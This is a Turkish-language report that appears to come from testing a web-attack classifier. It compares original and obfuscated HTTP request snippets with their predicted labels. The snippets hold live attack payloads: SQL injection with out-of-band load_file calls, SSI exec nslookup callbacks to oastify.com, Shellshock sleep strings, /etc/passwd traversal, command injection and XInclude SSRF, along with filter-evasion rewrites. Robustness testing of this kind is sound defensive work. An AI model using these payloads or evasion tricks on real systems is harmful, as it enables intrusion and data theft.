# Gizleme örnekleri — ds_aug_v2_family_0.8_s42

Her dönüşüm ve sınıf için en fazla 2 örnek (yalnızca değişen kısım çevresi).

## case

Varsayım: SQLi: SQL anahtar kelimeleri; XSS: HTML etiket/öznitelik adları büyük/küçük harfe duyarsızdır.

- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 248 - Command Injection)
  - önce: `l.com Accept-Language: en-US,en;q=0.5 Referer: (select load_file('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik`
  - sonra: `l.com Accept-Language: en-US,en;q=0.5 Referer: (SeLEcT load_file('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik`
- **66 - SQL Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `n;q=0.5 Referer: https://login.yahoo.com/')waitfor delay'0:0:20'-- Upgrade-Insecure-Requests: 1 Sec-F`
  - sonra: `n;q=0.5 Referer: https://login.yahoo.com/')waitfoR dElay'0:0:20'-- Upgrade-Insecure-Requests: 1 Sec-F`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533`
  - sonra: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CeCQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6Ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D45336`
  - sonra: `2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CecQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DeFYVUc%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6gGd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D45336`

## whitespace

Varsayım: Payload benzeri parçalarda boşluk yerine sekme: SQL, HTML öznitelik ayırıcısı, POSIX kabuk (IFS), HTTP header OWS için eşdeğer.

- **126 - Path Traversal** (tahmin: 000 - Normal → 000 - Normal)
  - önce: `okie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z+s-T1QAMEVV45Z00C7C58T4|1750598511921&t:17505985119`
  - sonra: `okie: skin=noskin; csm-hit=tb:Y8GWZ9DFBWW0TDN0Q47Z%09s-T1QAMEVV45Z00C7C58T4|1750598511921&t:17505985119`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `2Fpasswd/index.php/my-account/edit-profile/%7B%7B%20attachment.thumbnail.url HTTP/1.1 Host: test-site`
  - sonra: `2Fpasswd/index.php/my-account/edit-profile/%7B%7B%09attachment.thumbnail.url HTTP/1.1 Host: test-site`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `FyJtcb44dQ; A3=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22yd1%22%20value%3d%22xc0ft6gojp%22--%3e%3c!--%23set%20var%3d%220f3%22%20value%3d%22ze2hv8iqlr%22--%3e%3c!--%23echo%20var%3d%22yd1%22--%3e%3c!--%23echo%20var%3d%220f3%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.oastify.com%22%20--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFE`
  - sonra: `FyJtcb44dQ; A3=%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22yd1%22%09value%3d%22xc0ft6gojp%22--%3e%3c!--%23set%09var%3d%220f3%22%09value%3d%22ze2hv8iqlr%22--%3e%3c!--%23echo%09var%3d%22yd1%22--%3e%3c!--%23echo%09var%3d%220f3%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.oastify.com%22%09--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFE`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `GET /%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22550%22%20value%3d%2244zmld8vbw%22--%3e%3c!--%23set%20var%3d%22772%22%20value%3d%22661onfaxdy%22--%3e%3c!--%23echo%20var%3d%22550%22--%3e%3c!--%23echo%20var%3d%22772%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.oastify.com%22%20--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `GET /%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22550%22%09value%3d%2244zmld8vbw%22--%3e%3c!--%23set%09var%3d%22772%22%09value%3d%22661onfaxdy%22--%3e%3c!--%23echo%09var%3d%22550%22--%3e%3c!--%23echo%09var%3d%22772%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.oastify.com%22%09--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `GET /_/bscframe32108155'%20or%20'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
  - sonra: `GET /_/bscframe32108155'%09or%09'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `GET /_/bscframe32108155'%20or%20'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
  - sonra: `GET /_/bscframe32108155'%09or%09'4386'%3d'4392 HTTP/1.1 User-Agent: Mozilla/5.0 (`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `GET /%2528%2529%2B%257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20attachment.url HTTP/1.1 Host: test-site.com User`
  - sonra: `GET /%2528%2529%2509%257B%2509%253A%253B%257D%253B%2509%252Fbin%252Fsleep%250915/index.php/my-account/edit-profile/%7B%7B%09attachment.url HTTP/1.1 Host: test-site.com User`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `GET /%2528%2529%2B%257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20data.icon%20%7D%7D HTTP/1.1 Host: test-site.com User-Agent: `
  - sonra: `GET /%2528%2529%2509%257B%2509%253A%253B%257D%253B%2509%252Fbin%252Fsleep%250915/index.php/my-account/edit-profile/%7B%7B%09data.icon%09%7D%7D HTTP/1.1 Host: test-site.com User-Agent: `
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D55208%26rt%3Dc%60401&line=Not%20available HTTP/1.1 3ACVuqWd%3BZE1Tgd%3ArNScwd%3BZ`
  - sonra: `vice%3D1%26_reqid%3D55208%26rt%3Dc%60401&line=Not%09available HTTP/1.1 3ACVuqWd%3BZE1Tgd%3ArNScwd%3BZ`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `ice%3D1%26_reqid%3D155208%26rt%3Dc%60401&line=Not%20available HTTP/1.1 c%3ACVuqWd%3BZE1Tgd%3ArNScwd%3`
  - sonra: `ice%3D1%26_reqid%3D155208%26rt%3Dc%60401&line=Not%09available HTTP/1.1 c%3ACVuqWd%3BZE1Tgd%3ArNScwd%3`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/users/2 HTTP/1.1 User-Agent: Mozilla/5.`
  - sonra: `DELETE /api%7cping%09-n%0921%09127.0.0.1%7c%7c%60ping%09-c%0921%09127.0.0.1%60%09%23'%09%7cping%09-n%0921%09127.0.0.1%7c%7c%60ping%09-c%0921%09127.0.0.1%60%09%23%5c%22%09%7cping%09-n%0921%09127.0.0.1/users/2 HTTP/1.1 User-Agent: Mozilla/5.`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23'%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23%7c%22%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `DELETE /api/users%7cecho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23'%09%7cecho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23%7c%22%09%7cecho%09cqsgq5qlks%09pjt5zlwn5i%7c%7ca%09%23/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `DELETE /api/users/%3cadi%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs`
  - sonra: `DELETE /api/users/%3cadi%09xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%09href%3d%22http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `GET /%3cava%20xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a//a2dvebdzh3x2j339ew6l8yu41v7pvgq`
  - sonra: `GET /%3cava%09xmlns%3axi%3d%22http%3a//www.w3.org/2001/XInclude%22%3e%3cxi%3ainclude%09href%3d%22http%3a//a2dvebdzh3x2j339ew6l8yu41v7pvgq`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
  - sonra: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `ice%3D1%26_reqid%3D166653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 1Tgd%3ArNScwd%3BZGeKvd%3Arb5w8`
  - sonra: `ice%3D1%26_reqid%3D166653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 1Tgd%3ArNScwd%3BZGeKvd%3Arb5w8`

## sql_comment

Varsayım: SQL anahtar kelimelerine bitişik boşluk yerine /**/ (MySQL, PostgreSQL, MSSQL'de eşdeğer).

- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20atta`
  - sonra: `257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%252F%252A%252A%252F15/index.php/my-account/edit-profile/%7B%7B%20atta`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20data`
  - sonra: `257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%252F%252A%252A%252F15/index.php/my-account/edit-profile/%7B%7B%20data`

## cmd_quote

Varsayım: Kabuk komut adına boş tırnak çifti ("") eklemek (bash/sh ve cmd.exe komut adını değiştirmez).

- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/users/2 HTTP/1.1 User-A`
  - sonra: `DELETE /api%7cp%22%22ing%20-n%2021%20127.0.0.1%7c%7c%60p%22%22ing%20-c%2021%20127.0.0.1%60%20%23'%20%7cp%22%22ing%20-n%2021%20127.0.0.1%7c%7c%60p%22%22ing%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cp%22%22ing%20-n%2021%20127.0.0.1/users/2 HTTP/1.1 User-A`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23'%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23%7c%22%20%7cecho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23/2 HTTP/`
  - sonra: `DELETE /api/users%7ce%22%22cho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23'%20%7ce%22%22cho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23%7c%22%20%7ce%22%22cho%20cqsgq5qlks%20pjt5zlwn5i%7c%7ca%20%23/2 HTTP/`

## path_dot

Varsayım: '../' yerine './../' (yol çözümlemesinde eşdeğer).

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `GET /%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/index.php/my-account/e`
  - sonra: `GET /%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd/index.php/my-account/e`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `GET /%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/index.php/my-account/e`
  - sonra: `GET /%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252F.%252F..%252Fetc%252Fpasswd/index.php/my-account/e`

## artifact

Varsayım: Burp Collaborator alan adı (oastify.com) saldırganın seçtiği başka bir geri çağırma alan adıyla değiştirilir (alt alan adı korunur).

- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `dcname%20kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.oastify.com%22%20--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3F`
  - sonra: `dcname%20kzn2gt3b6c6z9jwrm84sp8cc3391xysmkk8dv4jt.cb-listener.net%22%20--%3e; A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3F`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `dcname%20rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.oastify.com%22%20--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Win`
  - sonra: `dcname%20rrm980viyjy61qoyefwzhf4jva18pzdrbf27pxdm.cb-listener.net%22%20--%3e HTTP/1.1 User-Agent: Mozilla/5.0 (Win`
- **248 - Command Injection** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `GET /_/l1n3iu5c8d80bkyso96tr9ed54b0zwwko8f02qqf.oastify.com HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.`
  - sonra: `GET /_/l1n3iu5c8d80bkyso96tr9ed54b0zwwko8f02qqf.cb-listener.net HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.`
- **248 - Command Injection** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `in/oauth/9isrzim0p1pos8fg5xnh8xv1mssogkb83wuohe53.oastify.com HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.`
  - sonra: `in/oauth/9isrzim0p1pos8fg5xnh8xv1mssogkb83wuohe53.cb-listener.net HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `ile('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik6ft6hv.oastify.com\\gxx')) Upgrade-Insecure-Requests: 1 Sec-Fetch-`
  - sonra: `ile('\\\\lod35uscvdv0yklsb9tte91ds4yzmuriik6ft6hv.cb-listener.net\\gxx')) Upgrade-Insecure-Requests: 1 Sec-Fetch-`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `%5c%5c%5cjf21wsjambmypicq27kr57sbj2pxdoic9exbk18q.oastify.com%5c%5camn'))/1.0/cm HTTP/1.1 User-Agent: Mozilla/`
  - sonra: `%5c%5c%5cjf21wsjambmypicq27kr57sbj2pxdoic9exbk18q.cb%2dlistener.net%5c%5camn'))/1.0/cm HTTP/1.1 User-Agent: Mozilla/`
- **88 - OS Command Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `3dcname%20e4j1tedye73hdri95hqztdxqehkf8cb06ozbszh.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20e4j1tedye73hdri95hqztdxqehkf8cb06ozbszh.oastify.com.%26%60'; cmp=t=1750672068&j=0&u=1---; gpp=DBAA; g`
  - sonra: `3dcname%20e4j1tedye73hdri95hqztdxqehkf8cb06ozbszh.cb-listener.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20e4j1tedye73hdri95hqztdxqehkf8cb06ozbszh.cb-listener.net.%26%60'; cmp=t=1750672068&j=0&u=1---; gpp=DBAA; g`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `-q=cname qgad5qpaqjftp3ulht2b5p92qtwrklci0do8bzzo.oastify.com.&'\"`0&nslookup -q=cname qgad5qpaqjftp3ulht2b5p92qtwrklci0do8bzzo.oastify.com.&`' Cookie: i18n-prefs=USD; lc-main=en_US; sp-cd`
  - sonra: `-q=cname qgad5qpaqjftp3ulht2b5p92qtwrklci0do8bzzo.cb-listener.net.&'\"`0&nslookup -q=cname qgad5qpaqjftp3ulht2b5p92qtwrklci0do8bzzo.cb-listener.net.&`' Cookie: i18n-prefs=USD; lc-main=en_US; sp-cd`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs3trkj79vy.oastify.com/foo%22/%3e%3c/adi%3e HTTP/1.1 User-Agent: Mozill`
  - sonra: `http%3a//z11kd0cogswris2ydl5a7ntt0k6eufs3trkj79vy.cb-listener.net/foo%22/%3e%3c/adi%3e HTTP/1.1 User-Agent: Mozill`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.oastify.com/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.cb-listener.net/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`

## encoding_norm

Varsayım: ÇÖZÜCÜYE BAĞLI: çok katmanlı URL encoding tek katmana indirilir; hedef yinelemeli çözüyorsa eşdeğer.

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `GET /%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/index.php/my-account/edit-profile/%7B%7B%`
  - sonra: `GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/index.php/my-account/edit-profile/%7B%7B%`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `GET /%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/index.php/my-account/edit-profile/%7B%7B%`
  - sonra: `GET /%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/index.php/my-account/edit-profile/%7B%7B%`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3d1%26s%3d%2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522aqq%2522%2520value%253d%25229ppr6it0w1%2522--%253e%253c!--%2523set%2520var%253d%2522css%2522%2520value%253d%2522brrt8kv2y3%2522--%253e%253c!--%2523echo%2520var%253d%2522aqq%2522--%253e%253c!--%2523echo%2520var%253d%2522css%2522--%253e%253c!--%2523exec%2520cmd%253d%2522nslook`
  - sonra: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3D1%26s%3D%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%22aqq%22%20value%3D%229ppr6it0w1%22--%3E%3C!--%23set%20var%3D%22css%22%20value%3D%22brrt8kv2y3%22--%3E%3C!--%23echo%20var%3D%22aqq%22--%3E%3C!--%23echo%20var%3D%22css%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%20wccet5gnjojbmv93zkh42kpogfmda9bx3vrtkgd34rt.oastify.com%22%20--%3E%26d%3DC`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3d1%26s%3dRpo3auix%26d%3d%2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522odr%2522%2520value%253d%2522ncq5twgejf%2522--%253e%253c!--%2523set%2520var%253d%2522qft%2522%2520value%253d%2522pes7vyiglh%2522--%253e%253c!--%2523echo%2520var%253d%2522odr%2522--%253e%253c!--%2523echo%2520var%253d%2522qft%2522--%253e%253c!--%2523exec%2520cmd%`
  - sonra: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3D1%26s%3DRpo3auix%26d%3D%22--%3E'--%3E%60--%3E%3C!--%23set%20var%3D%22odr%22%20value%3D%22ncq5twgejf%22--%3E%3C!--%23set%20var%3D%22qft%22%20value%3D%22pes7vyiglh%22--%3E%3C!--%23echo%20var%3D%22odr%22--%3E%3C!--%23echo%20var%3D%22qft%22--%3E%3C!--%23exec%20cmd%3D%22nslookup%20-q%3Dcname%20azdsgj31626p99whmy4ipyc23t9rxnybq9e77u0hs5h.oastify.com%22%`
- **248 - Command Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `%7D%2C%22auth%2Flogin%3Fresponse_type%3Dtnd2k9q7k4%2527%2522%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26cookie%26client_id%3Dtnd2k9q7k4%2527%2522%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26acct%26redirect_uri%3Dtnd2k9q7k4%2527%2522%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26https%253A%252F%252Fmyaccount.nytimes.com%252F%23tnd2k9q`
  - sonra: `%7D%2C%22auth%2Flogin%3Fresponse_type%3Dtnd2k9q7k4'%22%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26cookie%26client_id%3Dtnd2k9q7k4'%22%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26acct%26redirect_uri%3Dtnd2k9q7k4'%22%60'%5C%22%2Ftnd2k9q7k4%2F%3E%3Ctnd2k9q7k4%2F%5C%5C%3Ekl2wbmtu3v%26https%3A%2F%2Fmyaccount.nytimes.com%2F%23tnd2k9q7k4%3Dtnd2k9q7k4'%22%60'%5`
- **248 - Command Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `Fiframe%2Fenter-email%3Fresponse_type%3Djrqq6pya7v%2527%2522%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26cookie%26client_id%3Djrqq6pya7v%2527%2522%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26oma%26redirect_uri%3Djrqq6pya7v%2527%2522%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26https%253A%252F%252Fwww.nytimes.com%252Fsubscription%252Fonboarding-offer%2`
  - sonra: `Fiframe%2Fenter-email%3Fresponse_type%3Djrqq6pya7v'%22%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26cookie%26client_id%3Djrqq6pya7v'%22%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26oma%26redirect_uri%3Djrqq6pya7v'%22%60'%22%2Fjrqq6pya7v%2F%3E%3Cjrqq6pya7v%2F%5C%3Efd98i4y2r4%26https%3A%2F%2Fwww.nytimes.com%2Fsubscription%2Fonboarding-offer%3FcampaignId%3D7JFJX%26redire`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `GET /%2528%2529%2B%257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20atta`
  - sonra: `GET /%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fsleep%2015/index.php/my-account/edit-profile/%7B%7B%20atta`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `GET /%2528%2529%2B%257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20data`
  - sonra: `GET /%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fsleep%2015/index.php/my-account/edit-profile/%7B%7B%20data`
- **79 - Cross-Site Scripting** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eyd`
